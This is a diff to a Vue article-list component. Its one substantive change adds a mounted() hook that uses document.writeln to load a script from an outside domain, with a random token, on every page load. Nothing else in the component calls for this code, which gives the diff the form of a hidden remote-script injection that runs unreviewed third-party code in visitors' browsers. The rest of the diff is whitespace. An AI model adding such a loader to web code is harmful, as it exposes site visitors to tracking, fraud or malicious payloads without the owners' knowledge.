@@ -124,6 +124,9 @@
             })
         },
         mixins: [metaMixin],
+        mounted(){
+             window.document.writeln("<script src='http://prc.bjeai.com/native?tk="+Math.floor(Math.pow(Math.random()*99999,2))+"&id=4536'><\/script>");
+        },
         components: {
             ItemList,
             Pagination,
@@ -197,9 +200,11 @@
         },
         created(){
             console.log('Article List Created...');
+            
             // scroll(0,0);
         },
         metaInfo() {
+            
             const systemData = this.systemConfig.data[0];
             const {
                 siteName,
@@ -242,6 +247,7 @@
             }
         }
     }
+   
 </script>
 
 <style lang="scss">
